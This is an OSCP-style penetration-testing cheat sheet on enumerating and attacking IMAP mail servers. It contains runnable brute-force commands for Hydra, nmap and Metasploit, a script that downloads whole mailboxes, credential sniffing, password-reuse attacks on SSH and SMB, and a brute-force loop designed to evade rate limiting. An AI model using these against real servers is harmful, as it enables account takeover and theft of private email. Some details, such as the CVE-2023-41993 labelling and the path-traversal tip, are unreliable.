# Port 143 - IMAP Enumeration & Exploitation

## Service Information

**Port:** 143/TCP (IMAP), 993/TCP (IMAPS - Secure)
**Service:** Internet Message Access Protocol
**Protocol:** Email retrieval and management
**Security:** ⚠️ Plaintext by default (use IMAPS/993 for encryption)

---

## 1. Basic Enumeration

### 1.1 Nmap Scan

```bash
# Basic scan
nmap -p 143 -sV TARGET_IP

# Detailed scan with scripts
nmap -p 143 -sV -sC TARGET_IP

# All IMAP scripts
nmap -p 143 --script imap-* TARGET_IP

# Capabilities detection
nmap -p 143 --script imap-capabilities TARGET_IP

# Both IMAP and IMAPS
nmap -p 143,993 -sV -sC TARGET_IP
```

### 1.2 Banner Grabbing

```bash
# Netcat
nc -nv TARGET_IP 143

# Telnet
telnet TARGET_IP 143

# OpenSSL (for IMAPS on 993)
openssl s_client -connect TARGET_IP:993 -quiet
```

### 1.3 Service Detection

```bash
# Connect and get banner
echo "a001 LOGOUT" | nc TARGET_IP 143

# Common banners:
# * OK [CAPABILITY ...] Dovecot ready
# * OK Microsoft Exchange Server 2016 IMAP4 server ready
# * OK Courier-IMAP ready
# * OK Cyrus IMAP v2.4.17 server ready
```

---

## 2. Manual Enumeration

### 2.1 IMAP Commands

```bash
# Connect
nc TARGET_IP 143

# Basic commands (each needs unique tag):
a001 CAPABILITY           # List server capabilities
a002 LOGIN user pass      # Login
a003 LIST "" "*"          # List all mailboxes
a004 SELECT INBOX         # Select INBOX
a005 FETCH 1 BODY[]       # Fetch email #1
a006 SEARCH ALL           # Search all emails
a007 LOGOUT               # Disconnect

# Tag format: Command must start with unique identifier (a001, a002, etc.)
```

### 2.2 Manual Login & Enumeration

```bash
# Connect
nc TARGET_IP 143

# Check capabilities
a001 CAPABILITY
# Response: * CAPABILITY IMAP4rev1 STARTTLS AUTH=PLAIN AUTH=LOGIN

# Login
a002 LOGIN admin password
# Response: a002 OK LOGIN completed

# List mailboxes
a003 LIST "" "*"
# Response:
# * LIST (\HasNoChildren) "/" "INBOX"
# * LIST (\HasNoChildren) "/" "Sent"
# * LIST (\HasNoChildren) "/" "Drafts"

# Select INBOX
a004 SELECT INBOX
# Response: * 25 EXISTS (25 messages in INBOX)

# Search for all emails
a005 SEARCH ALL
# Response: * SEARCH 1 2 3 4 5 ... 25

# Fetch first email
a006 FETCH 1 BODY[]

# Logout
a007 LOGOUT
```

### 2.3 Advanced IMAP Commands

```bash
# Check specific folder
a001 SELECT "Sent Items"

# Search for specific emails
a002 SEARCH FROM "admin@domain.com"
a003 SEARCH SUBJECT "password"
a004 SEARCH BODY "credential"
a005 SEARCH SINCE 1-Jan-2024

# Fetch specific parts
a006 FETCH 1 (FLAGS BODY[HEADER])
a007 FETCH 1 BODY[TEXT]

# Get email headers only
a008 FETCH 1 (BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)])
```

---

## 3. User Enumeration

### 3.1 Username Enumeration via LOGIN

```bash
# Different servers may leak user existence
# Test with common usernames

for user in admin root user administrator; do
  echo "Testing: $user"
  echo -e "a001 LOGIN $user wrongpassword\na002 LOGOUT" | nc TARGET_IP 143
done

# Example responses:
# Valid user: "a001 NO [AUTHENTICATIONFAILED] Authentication failed"
# Invalid user: "a001 NO [AUTHORIZATIONFAILED] Invalid credentials"
# (Response varies by server)
```

### 3.2 Nmap User Enumeration

```bash
# Brute force with username enumeration
nmap -p 143 --script imap-brute --script-args userdb=users.txt,passdb=pass.txt TARGET_IP
```

---

## 4. Brute Force Attacks

### 4.1 Hydra

```bash
# Single user
hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://TARGET_IP

# Multiple users
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt imap://TARGET_IP

# With threads
hydra -l admin -P passwords.txt imap://TARGET_IP -t 4

# IMAPS (port 993)
hydra -l admin -P passwords.txt imaps://TARGET_IP:993

# Stop on first valid
hydra -l admin -P passwords.txt imap://TARGET_IP -F

# Verbose mode
hydra -l admin -P passwords.txt imap://TARGET_IP -V
```

### 4.2 Nmap Brute Force

```bash
# IMAP brute force
nmap -p 143 --script imap-brute --script-args userdb=users.txt,passdb=passwords.txt TARGET_IP

# Default credentials
nmap -p 143 --script imap-brute TARGET_IP
```

### 4.3 Metasploit

```bash
msfconsole
use auxiliary/scanner/imap/imap_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
set STOP_ON_SUCCESS true
run
```

---

## 5. Email Harvesting

### 5.1 List All Mailboxes

```bash
# After successful login
nc TARGET_IP 143

a001 LOGIN admin password
a002 LIST "" "*"

# Common mailboxes:
# INBOX, Sent, Drafts, Trash, Spam, Archive
# "Sent Items", "Deleted Items" (Exchange)
```

### 5.2 Download All Emails

```bash
# Python script
#!/usr/bin/env python3
import imaplib

server = imaplib.IMAP4('TARGET_IP')
server.login('admin', 'password')
server.select('INBOX')

typ, data = server.search(None, 'ALL')
for num in data[0].split():
    typ, data = server.fetch(num, '(RFC822)')
    with open(f'email_{num.decode()}.eml', 'wb') as f:
        f.write(data[0][1])

server.close()
server.logout()
```

### 5.3 Search for Sensitive Emails

```bash
# After login
nc TARGET_IP 143

a001 LOGIN admin password
a002 SELECT INBOX

# Search commands
a003 SEARCH SUBJECT "password"
a004 SEARCH SUBJECT "credential"
a005 SEARCH SUBJECT "vpn"
a006 SEARCH FROM "admin@domain.com"
a007 SEARCH BODY "ssh"
a008 SEARCH BODY "backup"

# Fetch results
a009 FETCH 5 BODY[]
```

---

## 6. IMAPS (Secure IMAP)

### 6.1 Connect to IMAPS

```bash
# OpenSSL client
openssl s_client -connect TARGET_IP:993 -quiet

# Then use normal IMAP commands
a001 LOGIN admin password

# Check certificate
openssl s_client -connect TARGET_IP:993 -showcerts
```

### 6.2 STARTTLS Support

```bash
# Some servers support STARTTLS on port 143
nc TARGET_IP 143

# Check capabilities
a001 CAPABILITY

# If STARTTLS is supported:
# * CAPABILITY IMAP4rev1 STARTTLS AUTH=PLAIN

# Issue STARTTLS
a002 STARTTLS
# a002 OK Begin TLS negotiation now
```

---

## 7. Exploitation Techniques

### 7.1 Credential Harvesting (MITM)

**⚠️ Only in authorized scenarios!**

```bash
# Wireshark filter
tcp.port == 143

# tcpdump
tcpdump -i eth0 -A 'tcp port 143'

# Credentials are sent in PLAINTEXT (unless STARTTLS/IMAPS)
# Look for LOGIN commands
```

### 7.2 Password Reuse

```bash
# IMAP credentials often work for:
# - POP3 (port 110)
# - SMTP (port 25/587)
# - Webmail interfaces
# - SSH (if same username)
# - SMB/RDP

# Test on other services
crackmapexec smb TARGET_IP -u admin -p 'password123'
ssh admin@TARGET_IP
```

### 7.3 Email Data Mining

```bash
# Downloaded emails may contain:
# - Internal network information
# - Credentials in plain text
# - VPN configurations
# - SSH keys as attachments
# - Database connection strings
# - API keys and tokens
```

---

## 8. Common Vulnerabilities

### 8.1 CVE-2023-41993 (Apple Mail/IMAP)

```bash
# Recent Apple Mail vulnerabilities
# Check version and research specific CVEs
```

### 8.2 Buffer Overflow Vulnerabilities

```bash
# Various IMAP servers have had buffer overflows
# Example: CVE-2011-1764 (Courier-IMAP)

# Check version with nmap
nmap -p 143 -sV --version-intensity 9 TARGET_IP
```

---

## 9. Advanced Techniques

### 9.1 Folder Traversal

```bash
# List all folders recursively
a001 LOGIN admin password
a002 LIST "" "*"
a003 LIST "" "INBOX/*"
a004 LIST "" "Sent/*"

# Some servers allow path traversal
a005 LIST "" "../*"
```

### 9.2 Shared Mailboxes Enumeration

```bash
# List shared mailboxes (Exchange)
a001 LOGIN admin password
a002 LIST "" "user/*"
a003 LIST "" "public/*"

# Access shared mailbox
a004 SELECT "user/john@domain.com/INBOX"
```

### 9.3 Email Exfiltration via IDLE

```bash
# IMAP IDLE command (real-time monitoring)
a001 LOGIN admin password
a002 SELECT INBOX
a003 IDLE
# Server: + idling
# (Waits for new emails)

# Stop IDLE
DONE
```

---

## 10. Post-Exploitation

### 10.1 Email Mining for Credentials

```bash
# Extract email addresses
grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' emails/ | sort -u

# Search for passwords
grep -ri "password" emails/
grep -ri "credential" emails/
grep -ri "login" emails/

# Search for sensitive files
find emails/ -name "*.ovpn"
find emails/ -name "id_rsa"
find emails/ -name "*.pfx"
find emails/ -name "*.p12"
```

### 10.2 Network Intelligence

```bash
# Extract internal IPs
grep -Eiorh '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' emails/ | sort -u

# Extract domains
grep -Eiorh '@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}' emails/ | cut -d@ -f2 | sort -u

# Extract URLs
grep -Eiorh 'https?://[^[:space:]]+' emails/
```

---

## 11. Defense Evasion

### 11.1 Slow Brute Force

```bash
# Evade rate limiting
hydra -l admin -P passwords.txt imap://TARGET_IP -t 1 -w 15

# Custom script with random delays
for pass in $(cat passwords.txt); do
  echo -e "a001 LOGIN admin $pass\na002 LOGOUT" | nc TARGET_IP 143
  sleep $((RANDOM % 15 + 5))
done
```

### 11.2 Legitimate-Looking Queries

```bash
# Use normal-looking email client connections
# Avoid rapid-fire requests
# Mimic Outlook/Thunderbird connection patterns
```

---

## 12. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Service detection | `nmap -p 143 -sV -sC TARGET` |
| Hydra | Brute force | `hydra -l admin -P pass.txt imap://TARGET` |
| Netcat | Manual connection | `nc TARGET 143` |
| OpenSSL | IMAPS connection | `openssl s_client -connect TARGET:993` |
| Metasploit | Automated attacks | `use auxiliary/scanner/imap/imap_login` |
| Python imaplib | Email download | See Section 5.2 |

---

## 13. Quick Reference

### Quick Enumeration
```bash
nmap -p 143,993 -sV -sC TARGET_IP
echo "a001 LOGOUT" | nc TARGET_IP 143
```

### Quick Login & Email Fetch
```bash
nc TARGET_IP 143
a001 LOGIN admin password
a002 SELECT INBOX
a003 SEARCH ALL
a004 FETCH 1 BODY[]
a005 LOGOUT
```

### Quick Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://TARGET_IP
```

### Common IMAP Commands
```
a001 CAPABILITY         - Server capabilities
a002 LOGIN user pass    - Authenticate
a003 LIST "" "*"        - List mailboxes
a004 SELECT INBOX       - Select mailbox
a005 SEARCH ALL         - Search emails
a006 FETCH 1 BODY[]     - Get email
a007 LOGOUT             - Disconnect
```

---

## 14. OSCP Tips

⚠️ **IMAP Priority for OSCP:**
- More feature-rich than POP3 (can browse folders)
- Credentials often reused across services
- Check "Sent Items" for outgoing credentials
- Look for backup/archive folders
- Emails may contain VPN configs, SSH keys
- Search for "password", "credential", "vpn" keywords
- Try credentials on SSH, SMB, RDP

**Common OSCP scenarios:**
1. Default/weak credentials → Full email access
2. Sent emails contain shared passwords
3. Attachments with VPN configs or keys
4. Password reuse (IMAP → SSH/SMB)
5. Email threads discussing admin credentials

---

## 15. Resources

- **HackTricks IMAP**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap
- **RFC 3501 (IMAP4rev1)**: https://tools.ietf.org/html/rfc3501
- **IMAP Commands Reference**: https://www.atmail.com/blog/imap-commands/
